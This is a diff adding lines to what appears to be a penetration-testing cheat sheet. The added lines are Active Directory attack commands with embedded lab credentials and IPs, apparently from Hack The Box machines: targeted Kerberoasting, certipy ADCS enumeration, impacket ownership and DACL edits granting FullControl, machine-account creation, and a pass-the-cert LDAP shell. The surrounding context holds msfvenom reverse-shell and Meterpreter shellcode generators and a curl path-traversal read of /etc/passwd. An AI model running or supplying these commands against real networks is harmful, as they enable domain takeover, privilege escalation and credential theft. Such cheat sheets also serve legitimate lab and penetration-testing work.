@@ -1442,8 +1442,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=your_IP LPORT=your_port -f c    # Wi
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_IP LPORT=your_port -f c  # Windows Meterpreter Reverse TCP en Shellcode, malware
 msfvenom -p windows/exec CMD=”cmd.exe /C your_command” -f c # CMD Windows Executable Shellcode, malware
 msfvenom -p windows/messagebox TEXT=”Message” -f c  # Windows Message Box Shellcode, malware
-
+targetedkerberoast.py --dc-ip IP -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
 # ADCS ENUMERATION | CERTICATES
+﻿certipy-ad find -u ca_svc -p 'Password@1' -target sequel.htb -text -stdout -vulnerable	# adcs enumeration | certificates
 netexec ldap domain.lab -u username -p password -M adcs 	# adcs enumeration | certificates
 ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName	# adcs enumeration | certificates
 certutil.exe -config - -ping	# adcs enumeration | certificates
@@ -1493,4 +1494,9 @@ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 #
 curl --proxy http://127.0.0.1:8080                                             ## CURL// use proxy
 curl -F myFile=@<FILE> http://<RHOST>                                          ## CURL// file upload
 curl${IFS}<LHOST>/<FILE>                                                       ## CURL// Internal Field Separator (IFS) example
+
+impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.40.55
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.40.55﻿
+impacket-addcomputer 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name livestep -computer-pass 1loggbz -dc-ip 10.129.229.56﻿
+passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56﻿
 
